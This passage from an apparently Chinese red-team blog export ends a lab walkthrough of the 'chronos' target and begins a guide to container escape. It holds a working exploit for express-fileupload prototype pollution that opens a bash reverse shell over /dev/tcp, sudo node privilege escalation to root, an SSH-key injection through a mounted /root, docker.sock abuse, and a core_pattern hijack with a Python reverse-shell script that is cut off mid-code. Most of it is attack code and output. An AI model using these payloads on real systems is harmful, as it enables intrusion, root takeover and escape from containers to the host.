class="line">server.listen(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h2 id="6-express-fileupload原型链污染漏洞"><a href="#6-express-fileupload原型链污染漏洞" class="headerlink" title="6. express fileupload原型链污染漏洞"></a>6. express fileupload原型链污染漏洞</h2><p>参考：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.bleepingcomputer.com<span class="regexp">/news/</span>security<span class="regexp">/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#原作者</span></span><br><span class="line">https:<span class="regexp">//</span>blog.p6.is<span class="regexp">/Real-World-JS-1/</span></span><br></pre></td></tr></table></figure>



<p>要利用这个漏洞服务端需要开启processNested，</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">So, <span class="keyword">if</span> <span class="keyword">options</span>.parseNested <span class="built_in">has</span> <span class="keyword">a</span> value. If calls processNested Function, <span class="built_in">and</span> <span class="keyword">argument</span> will <span class="keyword">be</span> req.body <span class="built_in">and</span> req.<span class="keyword">files</span>.</span><br></pre></td></tr></table></figure>

<p>很明显，server.js开启了</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">app.<span class="keyword">use</span>(fileupload(&#123; parseNested: <span class="literal">true</span> &#125;));</span><br></pre></td></tr></table></figure>



<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>kali监听6666，</p>
<ul>
<li>exp.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/172.16.42.147/6666 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>保存在kali, 使用python监听81端口，在目标机上下载执行。</p>
<p>进入靶机的tmp目录下载，执行exp.py</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python3</span> <span class="built_in">exp</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>

<p>反弹shell成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@kali /tmp]# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [172.16.42.147] from (UNKNOWN) [172.16.42.203] 59730</span><br><span class="line">bash: cannot set terminal process group (764): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">imera@chronos:/opt/chronos-v2/backend$</span><br></pre></td></tr></table></figure>

<p>获取第一个flag</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">imera@chronos:/opt/chronos-v2/backend$ cd /home/imera</span><br><span class="line">cd /home/imera</span><br><span class="line">imera@chronos:~$ ls</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">imera@chronos:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure>



<h2 id="7-sudo提权"><a href="#7-sudo提权" class="headerlink" title="7. sudo提权"></a>7. sudo提权</h2><p>尝试进入root目录失败</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">imera@chronos:~$ <span class="keyword">cd</span> <span class="string">/root</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/root</span></span><br><span class="line">bash: <span class="keyword">cd</span>: <span class="string">/root</span>: Permission denied</span><br></pre></td></tr></table></figure>



<p>执行<code>sudo -l</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">imera@chronos:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> imera on chronos:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=<span class="regexp">/usr/</span>local<span class="regexp">/sbin\:/u</span>sr<span class="regexp">/local/</span>bin\:<span class="regexp">/usr/</span>sbin\:<span class="regexp">/usr/</span>bin\:<span class="regexp">/sbin\:/</span>bin\:<span class="regexp">/snap/</span>bin</span><br><span class="line"></span><br><span class="line">User imera may run the following commands on chronos:</span><br><span class="line">    (ALL) NOPASSWD: <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>npm *</span><br><span class="line">    (ALL) NOPASSWD: <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>node *</span><br></pre></td></tr></table></figure>

<p>发现可以执行<code>npm</code>，<code>node</code>，那么我们可以利用Node shell提权。</p>
<p>执行如下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/bash&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure>

<p>成功提权</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">imera@chronos:~$ sudo node -e &#x27;child_process.spawn(&quot;/bin/bash&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br><span class="line">&lt;ild_process.spawn(&quot;/bin/bash&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p>获取到第二个flag</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure>























































































]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>容器逃逸</title>
    <url>/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<blockquote>
<p>谷神不死，是谓玄牝，玄牝之门，是谓天地根。</p>
</blockquote>
<p>容器逃逸相关手法总结</p>
<span id="more"></span>





<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h2><h3 id="1-1-容器识别"><a href="#1-1-容器识别" class="headerlink" title="1.1 容器识别"></a>1.1 容器识别</h3><blockquote>
<p>从 CGroup 信息中，不仅可以判断我们是否在容器内，也能很方便判断出当前的容器是否在 Kubernetes 的编排环境中。</p>
</blockquote>
<ul>
<li><p>命令：cat /proc/1/cgroup</p>
</li>
<li><p>结果：</p>
<p>在k8s环境下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@nginx-demo:/<span class="comment"># cat /proc/1/cgroup</span></span><br><span class="line">11:cpuset:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod7722e1f5_ce02_4c58_8337_7cabc99ad70f.slice/docker-72ad237185cc7bac0114e0ef58bbbd5f288ef638b58bb7ec5b16516d145a37df.scope</span><br><span class="line">10:cpuacct,cpu:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod7722e1f5_ce02_4c58_8337_7cabc99ad70f.slice/docker-72ad237185cc7bac0114e0ef58bbbd5f288ef638b58bb7ec5b16516d145a37df.scope</span><br><span class="line">9:devices:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod7722e1f5_ce02_4c58_8337_7cabc99ad70f.slice/docker-72ad237185cc7bac0114e0ef58bbbd5f288ef638b58bb7ec5b16516d145a37df.scope</span><br><span class="line">8:blkio:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod7722e1f5_ce02_4c58_8337_7cabc99ad70f.slice/docker-72ad237185cc7bac0114e0ef58bbbd5f288ef638b58bb7ec5b16516d145a37df.scope</span><br></pre></td></tr></table></figure>



<p>容器环境:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@250c9269ab90:/<span class="comment"># cat /proc/1/cgroup</span></span><br><span class="line">11:rdma:/</span><br><span class="line">10:perf_event:/docker/250c9269ab90f7b9d49913d841aa1f5dd91d317f336b773af151b476301dc48c</span><br><span class="line">9:devices:/docker/250c9269ab90f7b9d49913d841aa1f5dd91d317f336b773af151b476301dc48c</span><br><span class="line">8:blkio:/docker/250c9269ab90f7b9d49913d841aa1f5dd91d317f336b773af151b476301dc48c</span><br><span class="line">7:freezer:/docker/250c9269ab90f7b9d49913d841aa1f5dd91d317f336b773af151b476301dc48c</span><br></pre></td></tr></table></figure>



<ul>
<li>用到的pod</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-demo</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-deomo</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-2-特权容器识别"><a href="#1-2-特权容器识别" class="headerlink" title="1.2 特权容器识别"></a>1.2 特权容器识别</h3><blockquote>
<p>开启特权模式（privileged）的容器允许容器访问所有宿主机设备。</p>
</blockquote>
<ul>
<li><p>命令：fdisk -l （特权容器会看到磁盘挂载，无特权容器看不到任何信息）</p>
</li>
<li><p>结果：</p>
<p>正常容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@250c9269ab90:/<span class="comment"># fdisk -l</span></span><br><span class="line">root@250c9269ab90:/<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>特权容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@bda49fc3063c:/<span class="comment"># fdisk -l</span></span><br><span class="line">Disk /dev/sda: 41 GiB, 44023414784 bytes, 85983232 sectors</span><br><span class="line">Disk model: VMware Virtual S</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x15ec275c</span><br><span class="line"></span><br><span class="line">Device     Boot    Start      End  Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *        2048 83982335 83980288   40G 83 Linux</span><br><span class="line">/dev/sda2       83984382 85981183  1996802  975M  5 Extended</span><br><span class="line">/dev/sda5       83984384 85981183  1996800  975M 82 Linux swap / Solaris</span><br></pre></td></tr></table></figure>

<p>正常pod:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># fdisk -l</span></span><br><span class="line">/ <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>特权pod:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ <span class="comment"># fdisk -l</span></span><br><span class="line">Disk /dev/sda: 20 GB, 21474836480 bytes, 41943040 sectors</span><br><span class="line">2610 cylinders, 255 heads, 63 sectors/track</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line"></span><br><span class="line">Device  Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type</span><br><span class="line">/dev/sda1 *  0,32,33     130,170,40        2048    2099199    2097152 1024M 83 Linux</span><br><span class="line">/dev/sda2    130,170,41  1023,254,63    2099200   41943039   39843840 18.9G 8e Linux LVM</span><br><span class="line">Disk /dev/dm-0: 17 GB, 18249416704 bytes, 35643392 sectors</span><br><span class="line">2218 cylinders, 255 heads, 63 sectors/track</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line"></span><br><span class="line">Disk /dev/dm-0 doesn<span class="string">&#x27;t contain a valid partition table</span></span><br><span class="line"><span class="string">Disk /dev/dm-1: 2048 MB, 2147483648 bytes, 4194304 sectors</span></span><br><span class="line"><span class="string">261 cylinders, 255 heads, 63 sectors/track</span></span><br><span class="line"><span class="string">Units: sectors of 1 * 512 = 512 bytes</span></span><br></pre></td></tr></table></figure></li>
<li><p>使用到的pod</p>
<p>正常：kubectl exec -it alpine-test /bin/sh</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">alpine-test</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">alpine-test</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;alpine&quot;</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;tail -f /dev/null&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>特权：kubectl exec -it alpine-privileged /bin/sh</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">apiVersion:</span> v1</span><br><span class="line"><span class="symbol">kind:</span> Pod</span><br><span class="line"><span class="symbol">metadata:</span></span><br><span class="line"><span class="symbol">  name:</span> alpine-privileged</span><br><span class="line"><span class="symbol">spec:</span></span><br><span class="line"><span class="symbol">  containers:</span></span><br><span class="line">  - name: alpine-privileged</span><br><span class="line"><span class="symbol">    image:</span> <span class="string">&quot;alpine&quot;</span></span><br><span class="line"><span class="symbol">    securityContext:</span></span><br><span class="line"><span class="symbol">      privileged:</span> true</span><br><span class="line"><span class="symbol">    command:</span> [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;tail -f /dev/null&quot;</span>]</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-3-收集挂载信息"><a href="#1-3-收集挂载信息" class="headerlink" title="1.3 收集挂载信息"></a>1.3 收集挂载信息</h3><blockquote>
<p>挂载危险目录可能导致容器逃逸</p>
</blockquote>
<ul>
<li><p>命令：cat /proc/self/mounts</p>
</li>
<li><p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@94c7b539e243:/<span class="comment"># cat /proc/self/mounts</span></span><br><span class="line">overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/ZLTGXOQUKDQSUUEYOU4LEPOTDT:/var/lib/docker/overlay2/l/ACBJV6BUBICY2UWKF6RUSJL2CK:/var/lib/docker/overlay2/l/PEHRSEOSUK5N4LS3TWGFN5AMPF:/var/lib/docker/overlay2/l/WJJQ32N4WYNZPOBCJU6RYNJSZW:/var/lib/docker/overlay2/l/L2WLPD3OB5VQ4BMALKIS7YQZYS:/var/lib/docker/overlay2/l/FKNSIMUASM2XH4VM7NPQTA7LVH:/var/lib/docker/overlay2/l/JLNADHKMD3V6INRNN6XSWIJJTU:/var/lib/docker/overlay2/l/MNMWFARRFGRRJIB2BPJZKKIPL2:/var/lib/docker/overlay2/l/FQT3GCMVXV66A4XDYNO5ZTIPWZ:/var/lib/docker/overlay2/l/NW7UV3VUTVI4HAZMYJYLFNR7DX:/var/lib/docker/overlay2/l/GQBU5K7FNQ6WKYQ4UZKVE34YDF:/var/lib/docker/overlay2/l/NLQIT2NYYWUOKV6X3HU6V2HM4T:/var/lib/docker/overlay2/l/LQUSKZUHCPUZYHYUNJDK2VYSFC,upperdir=/var/lib/docker/overlay2/516dcfd41ed86e852677c6a0a3c58ba7f3b9e7b5898542f4daba5eafe91d34d0/diff,workdir=/var/lib/docker/overlay2/516dcfd41ed86e852677c6a0a3c58ba7f3b9e7b5898542f4daba5eafe91d34d0/work 0 0</span><br><span class="line">proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0</span><br><span class="line">tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0</span><br><span class="line">devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0</span><br><span class="line">sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0</span><br><span class="line">tmpfs /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode=755 0 0</span><br><span class="line">cgroup /sys/fs/cgroup/systemd cgroup rw,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0</span><br><span class="line">cgroup /sys/fs/cgroup/net_cls,net_prio cgroup rw,nosuid,nodev,noe</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-4-收集特权信息"><a href="#1-4-收集特权信息" class="headerlink" title="1.4 收集特权信息"></a>1.4 收集特权信息</h3><blockquote>
<p>有的特权可导致容器逃逸</p>
</blockquote>
<ul>
<li><p>命令：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/proc/</span>self/status</span><br><span class="line">或者</span><br><span class="line">capsh --<span class="keyword">print</span></span><br><span class="line"></span><br><span class="line">如果没有capsh命令可以</span><br><span class="line">先：cat <span class="regexp">/proc/</span><span class="number">1</span>/status | <span class="keyword">grep</span> Cap</span><br><span class="line">获取结果</span><br><span class="line">然后在自己的机器上进行：capsh --decode=<span class="number">00000000</span>a80425fb</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master testpod]<span class="comment"># capsh --print</span></span><br><span class="line">Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36+ep</span><br><span class="line">Bounding <span class="built_in">set</span> =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36</span><br><span class="line">Securebits: 00/0x0/1<span class="string">&#x27;b0</span></span><br><span class="line"><span class="string"> secure-noroot: no (unlocked</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-5-找到容器在宿主机的根目录"><a href="#1-5-找到容器在宿主机的根目录" class="headerlink" title="1.5 找到容器在宿主机的根目录"></a>1.5 找到容器在宿主机的根目录</h3><blockquote>
<p>找到容器的根目录在很多时候可以帮助我们逃逸，比如在利用procfs挂载进行逃逸的时候</p>
</blockquote>
<p>获取当前容器在宿主机的绝对路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /proc/self/mounts | grep docker</span><br><span class="line">或</span><br><span class="line">cat /proc/mounts | grep docker</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@d30d39f245c9:/tmp<span class="comment"># cat /proc/self/mounts | grep docker</span></span><br><span class="line">overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/LV2YDJ3G5EYUJN5WKESCKZJMDS:/var/lib/docker/overlay2/l/O34WL63RTLQ5HQEM3T7KBT4ZQ5,upperdir=/var/lib/docker/overlay2/6d0b3e2f5d85784f44f2246a03bb6b9ec066976730ef60ac7b4e4ae16f71874c/diff,workdir=/var/lib/docker/overlay2/6d0b3e2f5d85784f44f2246a03bb6b9ec066976730ef60ac7b4e4ae16f71874c/work 0 0</span><br></pre></td></tr></table></figure>

<p>结果中<code>/var/lib/docker/overlay2/6d0b3e2f5d85784f44f2246a03bb6b9ec066976730ef60ac7b4e4ae16f71874c</code>就是容器在宿主机的根目录，</p>
<p>在宿主机中我们切换到该目录查看一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  6d0b3e2f5d85784f44f2246a03bb6b9ec066976730ef60ac7b4e4ae16f71874c ls</span><br><span class="line">diff  link  lower  merged  work</span><br></pre></td></tr></table></figure>

<p>==diff: 是我们挂载到容器的目录==</p>
<p>==merged: 容器的根目录==</p>
<h2 id="2-特殊路径挂载导致的容器逃逸"><a href="#2-特殊路径挂载导致的容器逃逸" class="headerlink" title="2. 特殊路径挂载导致的容器逃逸"></a>2. 特殊路径挂载导致的容器逃逸</h2><p>这类的挂载很好理解，当例如宿主机的内的 /, /etc/, /root/.ssh 等目录的写权限被挂载进容器时，在容器内部可以修改宿主机内的 /etc/crontab、/root/.ssh/、/root/.bashrc 等文件执行任意命令，就可以导致容器逃逸。</p>
<h3 id="2-1-通过挂载的root目录进行逃逸"><a href="#2-1-通过挂载的root目录进行逃逸" class="headerlink" title="2.1 通过挂载的root目录进行逃逸"></a>2.1 通过挂载的root目录进行逃逸</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 挂载root目录的容器</span></span><br><span class="line">docker run -it --rm -v <span class="regexp">/root:/</span>root debian <span class="regexp">/bin/</span>bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看挂载信息</span></span><br><span class="line">cat <span class="regexp">/proc/</span>self/mounts</span><br><span class="line"></span><br><span class="line"><span class="comment">#写入ssh公钥</span></span><br><span class="line">echo <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRqTYN4ot1TYFk7Q6wTlUlbyGNau91tMdVAkMrzThzf9u83HqYSYs1rIrguv7ThipBhV0KIRZr02AfHlB2mqKXnMun6fMZlkkVVTPFhUV9aaRNIlRBD84AXncPqktY6uL38a6tZ3nxz/qOtYAl59tjQA2OKLF62ZquUNA2JKw2iIdO+o6r84OqA1nusO2oQP01luK53+w+oKZ30KnDRqy4lzrxkxPApHlwfZKPOdrHkMW/Z0Vj4ZXYjoffJoYOUYCFfR36GwZuxjgxkxwJoitTz0GIZxVnG+rkA5Wi3LatFHBHIZJVyrBVC3bxUFIHESvkpZv/fGCFNLChvAKvPHmD1PbA8V4jGT/hibYmxRPwex5SPq6WMBeZ6a3j4tvCkpLRuv7qTC/JwRaCKx6iyqGntkXCP2G59Kvzxxte7ShgHIMEDyrBNmsb47nUy0o6nUTJ2ThDNIIlPtgouVfw4bJ0Dqr5UhIpMsNJyeAa7VWQCeolvWTxvoLJuR8= ss@MacBook-Pro.local&quot;</span> &gt;&gt; <span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment">#直接登录</span></span><br><span class="line">ssh <span class="number">172.16</span>.<span class="number">42.100</span></span><br></pre></td></tr></table></figure>

<p>挂载的其他目录同理</p>
<h3 id="2-2-挂载Docker-Socket的情况"><a href="#2-2-挂载Docker-Socket的情况" class="headerlink" title="2.2 挂载Docker Socket的情况"></a>2.2 挂载Docker Socket的情况</h3><p>其中一个比较特殊且常见的场景是当宿主机的 /var/run/docker.sock 被挂载容器内的时候，容器内就可以通过 docker.sock 在宿主机里创建任意配置的容器，此时可以理解为可以创建任意权限的进程；当然也可以控制任意正在运行的容器。这类的设计被称为： Docker in Docker。常见于需要对当前节点进行容器管理的编排逻辑容器里。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建挂载Docker Socket的场景</span></span><br><span class="line">docker run -it --rm --name debiantest -v <span class="regexp">/var/</span>run<span class="regexp">/docker.sock:/</span>var<span class="regexp">/run/</span>docker.sock -v <span class="regexp">/usr/</span>bin<span class="regexp">/docker:/u</span>sr<span class="regexp">/bin/</span>docker debian</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看挂载信息</span></span><br><span class="line">cat <span class="regexp">/proc/</span>self/mounts | grep docker</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动一个挂载根目录的容器</span></span><br><span class="line">docker run -it -v <span class="regexp">/:/</span>shadowtest debian <span class="regexp">/bin/</span>bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#切换到宿主机根目录</span></span><br><span class="line">chroot /shadowtest</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看用户确认挂载成功</span></span><br><span class="line"><span class="comment"># cat /etc/shadow | grep shadowflow</span></span><br><span class="line">shadowflow:<span class="variable">$6</span><span class="variable">$oNvbnhpdcJooQ</span><span class="variable">$N</span>:<span class="number">7</span>:::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h3 id="2-3-挂载procfs的情况"><a href="#2-3-挂载procfs的情况" class="headerlink" title="2.3 挂载procfs的情况"></a>2.3 挂载procfs的情况</h3><p>procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多非常敏感、重要的文件。</p>
<p>一般来说不会将宿主机的procfs挂载到容器中。然而，有些业务为了实现某些特殊需求，还是会将该文件系统挂载进来。</p>
<p>procfs中的/proc/sys/kernel/core_pattern负责配置进程崩溃时内存转储数据的导出方式。从2.6.19内核版本开始，Linux支持在/proc/sys/kernel/core_pattern中使用新语法，如果在该文件中的首个字符是管道符（|），那么该行的剩余内容将被当做用户空间程序或脚本解释并执行。那么我们就可以在管道符后写入后门程序达到命令执行的效果。</p>
<ol>
<li><p>创建一个映射proc目录的容器</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run -v <span class="regexp">/proc:/</span>host_proc --rm -it debian <span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure></li>
<li><p>获取当前容器在宿主机的绝对路径</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/proc/</span>self/mounts | <span class="keyword">grep</span> docker</span><br><span class="line">或</span><br><span class="line">cat <span class="regexp">/proc/m</span>ounts | <span class="keyword">grep</span> docker</span><br></pre></td></tr></table></figure>

<p>结果:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ed4a9a47d52f:/<span class="comment"># cat /proc/self/mounts | grep docke</span></span><br><span class="line">overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/QKKB57DGVWIT5IAYNN74NHOKIE:/var/lib/docker/overlay2/l/O34WL63RTLQ5HQEM3T7KBT4ZQ5,upperdir=/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/diff,workdir=/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/work 0 0</span><br></pre></td></tr></table></figure>

<p>根据1.5的知识我们知道容器在宿主机的根目录为：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/docker/</span>overlay2<span class="regexp">/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/m</span>erged</span><br></pre></td></tr></table></figure></li>
<li><p>payload改造</p>
<p>我们不能直接用如下payload：</p>
<p><code>echo -e &quot;|/tmp/.x.py \rcore&quot; &gt;&gt; /proc/sys/kernel/core_pattern</code></p>
<p>因为程序崩溃的时候宿主机是没办法找到容器内的exp的。</p>
<p>那么我们修改为宿主机目录，并且将proc改为映射的宿主机目录</p>
<p>==最终payload如下：==</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">echo -e <span class="string">&quot;|/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.py core&quot;</span> &gt;&gt; <span class="regexp">/host_proc/</span>sys<span class="regexp">/kernel/</span>core_pattern</span><br></pre></td></tr></table></figure>



<p>x.py可以写成反弹shell的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">lhost = <span class="string">&quot;172.16.42.100&quot;</span></span><br><span class="line">lport = <span class="number">4444</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((lhost, lport))</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">    